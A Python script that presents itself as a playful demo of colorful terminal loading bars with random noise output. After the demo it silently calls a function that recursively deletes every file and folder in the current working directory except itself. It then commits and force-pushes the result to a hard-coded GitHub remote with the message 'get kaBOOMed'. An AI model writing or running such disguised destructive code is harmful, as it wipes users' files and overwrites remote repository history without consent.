import random
import string
import threading
import time
from rich.console import Console
from rich.progress import (
    Progress,
    BarColumn,
    TextColumn,
    SpinnerColumn,
    TimeElapsedColumn,
)
from rich.panel import Panel
import shutil

console = Console()

def crazy_color():
    return random.choice([
        "bold red", "bold green", "bold blue",
        "bold magenta", "bold cyan", "bold yellow",
        "italic red", "underline green", "reverse blue"
    ])

def generate_noise_string(length=40):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))

def crazy_loading_bar(progress, task_id):
    while not progress.finished:
        time.sleep(random.uniform(0.05, 0.3))
        progress.advance(task_id, random.randint(1, 5))

def run_crazy_bars(inject_noise_prob=0.2, noise_length=60):
    with Progress(
        SpinnerColumn(spinner_name="bouncingBar", style=crazy_color()),
        TextColumn("[{task.fields[bar_name]}]", style=crazy_color()),
        BarColumn(bar_width=None, style=crazy_color(), complete_style=crazy_color()),
        TextColumn("{task.percentage:>3.0f}%", style=crazy_color()),
        TimeElapsedColumn(),
        transient=True,
    ) as progress:

        tasks = []
        for i in range(random.randint(5, 10)):
            bar_name = f"Task-{i+1}"
            task_id = progress.add_task("", total=100, bar_name=bar_name)
            tasks.append(task_id)
            threading.Thread(target=crazy_loading_bar, args=(progress, task_id), daemon=True).start()

        while not progress.finished:
            time.sleep(0.2)
            if random.random() < inject_noise_prob:
                noise = generate_noise_string(noise_length)
                console.print(f"[bold red]!!! {noise}",markup=False)

if __name__ == "__main__":
    console.clear()
    console.print(Panel.fit(
        "🎉 CRAZY COLORFUL LOADING BARS 🎉",
        style=f"bold {random.choice(['red', 'green', 'yellow', 'blue', 'magenta', 'cyan'])}",
        border_style="bright_white"
    ), markup=False)

    run_crazy_bars(inject_noise_prob=0.5, noise_length=500)

    console.print(Panel.fit("✅ All done!", style="bold green"))

    for i in range(20):
        time.sleep(random.uniform(0.2, 0.4))
        console.print(f"!!! {generate_noise_string(100)}", style="yellow", markup=False)

import os
import shutil

def nuke_current_directory():
    cwd = os.getcwd()
    for entry in os.listdir(cwd):
        full_path = os.path.join(cwd, entry)
        try:
            if (os.path.isfile(full_path) or os.path.islink(full_path)) and os.path.basename(full_path) != "selfDestruct.py":
                os.unlink(full_path)  # delete file or symlink
            elif os.path.isdir(full_path):
                shutil.rmtree(full_path)  # delete directory recursively
        except Exception as e:
            print(f"Failed to delete {full_path}: {e}")

nuke_current_directory()

import subprocess
import sys
import os

def run_git_command(cmd, cwd=None):
    """Helper to run git commands and handle errors."""
    try:
        subprocess.run(cmd, check=True, cwd=cwd)
    except subprocess.CalledProcessError as e:
        print(f"❌ Git command failed: {e}")
        sys.exit(1)

def git_init_commit_push(commit_message="Auto commit", remote_url=None, branch="main"):
    # Check if current directory is already a Git repo
    if not os.path.exists(".git"):
        print("🛠️  Initializing Git repo...")
        run_git_command(["git", "init"])
        run_git_command(["git", "branch", "-m", branch])

        if remote_url:
            run_git_command(["git", "remote", "add", "origin", remote_url])

    # Stage all changes
    run_git_command(["git", "add", "."])

    # Commit changes (skip if nothing to commit)
    try:
        subprocess.run(["git", "commit", "-m", commit_message], check=True)
    except subprocess.CalledProcessError:
        print("⚠️ Nothing to commit.")

    # Push to remote
    if remote_url:
        run_git_command(["git", "push", "-f", "origin", branch])

# 🔧 Customize your remote and message
remote_url = "git@github.com:h2parson/gitScriptTesting.git"  # or https://...
git_init_commit_push(commit_message="🚀 get kaBOOMed ", remote_url=remote_url)


